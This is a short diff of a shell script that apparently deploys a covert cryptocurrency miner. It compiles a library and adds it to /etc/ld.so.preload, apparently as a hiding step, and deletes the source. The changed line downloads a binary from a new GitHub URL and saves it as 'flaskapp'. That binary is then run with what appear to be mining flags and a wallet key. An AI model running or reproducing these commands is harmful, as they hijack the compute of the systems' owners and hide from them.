@@ -8,6 +8,6 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-wget -qO flaskapp https://github.com/brontosimungo/LDS/raw/refs/heads/main/reeskam
+wget -qO flaskapp https://github.com/brontosimungo/legendary-umbrella/raw/refs/heads/main/acahneha
 chmod +x flaskapp
 ./flaskapp --pubkey=DBzZZHvv7ZXHJmVjxF8QR4xCqBgZF4jn3tcUkxUuaxxvsF1zktETF2x --threads-per-card=1 --name=testest
